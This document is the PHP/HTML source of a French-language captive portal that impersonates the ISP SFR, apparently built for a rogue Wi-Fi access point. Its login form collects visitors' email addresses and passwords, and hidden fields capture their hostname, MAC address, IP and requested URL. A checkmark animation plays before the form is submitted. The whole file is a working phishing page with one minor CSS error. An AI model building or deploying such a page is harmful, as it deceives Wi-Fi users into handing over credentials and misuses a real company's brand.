<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Portail Captif SFR Premium</title>

<!-- Mini Tailwind CSS local -->
<style>
/* ===== MINI TAILWIND ===== */
* { box-sizing:border-box; margin:0; padding:0; font-family:sans-serif; }
body { background:#1e1e1e; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; }
.flex { display:flex; }
.items-center { align-items:center; }
.justify-center { justify-content:center; }
.w-full { width:100%; }
.max-w-sm { max-width:380px; }
.bg-gray-800 { background: rgba(42,42,42,0.85); }
.rounded-xl { border-radius:1rem; }
.p-6 { padding:2rem; }
.text-center { text-align:center; }
.text-red-600 { color:#e60028; }
.text-gray-400 { color:#ccc; }
.mb-4 { margin-bottom:1rem; }
.mb-6 { margin-bottom:1.5rem; }
.mb-2 { margin-bottom:0.5rem; }
.px-4 { padding-left:1rem; padding-right:1rem; }
.py-3 { padding-top:0.75rem; padding-bottom:0.75rem; }
.border { border:1px solid #555; }
.rounded { border-radius:0.5rem; }
.bg-gray-700 { background: rgba(50,50,50,0.8); }
.focus-outline { outline:2px solid #e60028; }
.btn { width:100%; py-3; rounded; font-weight:bold; cursor:pointer; mb-2; transition:0.2s; }
.btn-login { background:#e60028; color:#fff; }
.btn-login:hover { background:#ff2c48; }
.btn-guest { background:transparent; border:1px solid #aaa; color:#ccc; }
.btn-guest:hover { color:#fff; border-color:#e60028; }
/* Success animation */
#success { position:absolute; inset:0; display:flex; justify-content:center; align-items:center; background:rgba(0,0,0,0.6); font-size:3rem; border-radius:1rem; opacity:0; pointer-events:none; transition:opacity 0.3s ease; z-index:20; }
#success.show { opacity:1; }
/* Logo halo */
.logo-container { position:relative; display:inline-block; margin-bottom:1rem; }
.logo-halo { position:absolute; inset:0; border-radius:50%; background: radial-gradient(circle,#e60028 0%,transparent 70%); filter:blur(20px); animation: pulse 2s infinite alternate; z-index:-1; }
@keyframes pulse { 0%{transform:scale(1);} 100%{transform:scale(1.2);} }
/* Particles */
.particle { position:absolute; width:6px; height:6px; border-radius:50%; background: radial-gradient(circle,#ff3b50 0%,#ff6b6b 80%); pointer-events:none; opacity:0.8; filter:blur(2px); animation:fadeOut 0.6s forwards; z-index:5; }
@keyframes fadeOut { 0% { transform:scale(1); opacity:0.8; } 100% { transform:scale(0); opacity:0; } }
/* Orbs */
.orb { position:absolute; width:15px; height:15px; border-radius:50%; background: radial-gradient(circle,#ff3b50 0%,#ff6b6b 80%); box-shadow:0 0 15px rgba(255,59,80,0.6); pointer-events:none; z-index:5; opacity:0.8; }
</style>
</head>
<body>

<div id="orbsContainer"></div>

<div class="bg-gray-800 rounded-xl p-6 text-center max-w-sm" id="card">
  <div class="logo-container">
    <div class="logo-halo"></div>
    <img src="assets/sfr_logo.jpg" alt="SFR Logo" style="width:120px;">
  </div>
  <h1 class="text-red-600 mb-2 text-xl">Accès Wi-Fi SFR</h1>
  <p class="text-gray-400 mb-6 text-sm">Connectez-vous pour profiter d’Internet en toute sécurité.</p>

  <form method="POST" action="/captiveportal/index.php" id="form">
    <input class="w-full py-3 px-4 mb-4 rounded border bg-gray-700 text-white" name="email" type="email" placeholder="Adresse e-mail" required>
    <input class="w-full py-3 px-4 mb-4 rounded border bg-gray-700 text-white" name="password" type="password" placeholder="Mot de passe" required>

    <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
    <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
    <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
    <input type="hidden" name="target" value="<?=$destination?>">

    <button type="submit" class="btn btn-login mb-2">Se connecter</button>
  </form>
  <button id="guestBtn" class="btn btn-guest">Connexion invitée</button>
</div>

<div id="success">✓</div>

<script>
// Success animation + POST
const form = document.getElementById('form');
const guestBtn = document.getElementById('guestBtn');
const success = document.getElementById('success');
const card = document.getElementById('card');
const orbsContainer = document.getElementById('orbsContainer');

function showSuccess() {
  success.classList.add('show');
  setTimeout(()=> success.classList.remove('show'), 900);
}

form.addEventListener('submit', function(e){
  e.preventDefault();
  showSuccess();
  setTimeout(()=> form.submit(), 500);
});
guestBtn.addEventListener('click', showSuccess);

// Particles
function createParticle(x,y){
  const p=document.createElement('div');
  p.className='particle';
  p.style.left=x+'px';
  p.style.top=y+'px';
  document.body.appendChild(p);
  setTimeout(()=>p.remove(),600);
}
window.addEventListener('mousemove', e=>createParticle(e.clientX,e.clientY));
window.addEventListener('touchmove', e=>{
  for(let t of e.touches) createParticle(t.clientX,t.clientY);
});

// Card tilt
function updateTilt(x,y){ card.style.transform=`rotateX(${x}deg) rotateY(${y}deg)`; }
window.addEventListener('mousemove', e=>{
  const cx=window.innerWidth/2, cy=window.innerHeight/2;
  updateTilt((e.clientY-cy)/cy*10, (e.clientX-cx)/cx*10);
});
window.addEventListener('deviceorientation', e=>{
  const x=e.beta?(e.beta-45)/45*10:0, y=e.gamma?e.gamma/45*10:0;
  updateTilt(x,y);
});

// Orbs
const orbs=[];
for(let i=0;i<8;i++){
  const orb=document.createElement('div');
  orb.className='orb';
  orb.style.left=Math.random()*100+'%';
  orb.style.top=Math.random()*100+'%';
  orbsContainer.appendChild(orb);
  orbs.push(orb);
}
function moveOrbs(x,y){
  orbs.forEach((orb,i)=>{ const offset=5+i*2; orb.style.transform=`translate(${y*offset}px,${x*offset}px)`; });
}
window.addEventListener('mousemove', e=>{
  const cx=window.innerWidth/2, cy=window.innerHeight/2;
  moveOrbs((e.clientY-cy)/cy*10, (e.clientX-cx)/cx*10);
});
window.addEventListener('deviceorientation', e=>{
  const x=e.beta?(e.beta-45)/45*10:0, y=e.gamma?e.gamma/45*10:0;
  moveOrbs(x,y);
});
</script>
</body>
</html>
